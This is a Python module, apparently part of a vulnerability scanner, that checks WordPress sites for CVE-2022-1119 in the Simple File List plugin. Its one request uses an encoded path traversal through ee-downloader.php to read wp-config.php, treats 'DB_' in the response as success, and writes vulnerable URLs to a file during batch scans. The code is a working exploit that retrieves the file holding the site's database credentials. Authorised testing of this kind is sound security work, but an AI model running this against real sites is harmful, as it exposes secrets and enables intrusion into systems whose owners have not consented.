#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2022_1119:
    def get_url(self,input_url):
        try:
            baseurl = input_url + "/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php"
            req = requests.get(baseurl, headers=self.headers,verify=self.ssl,proxies=self.proxy)
            if "DB_" in req.text:
                OutPrintInfoSuc("WordPress", f'目标存在CVE-2022-1119漏洞: {baseurl}')
                if self.batch:
                    OutPutFile("wordpress_2022_1119.txt",f'目标存在CVE-2022-1119漏洞: {baseurl}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在CVE-2022-1119漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("WordPress",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测CVE-2022-1119漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'CVE-2022-1119漏洞检测结束')



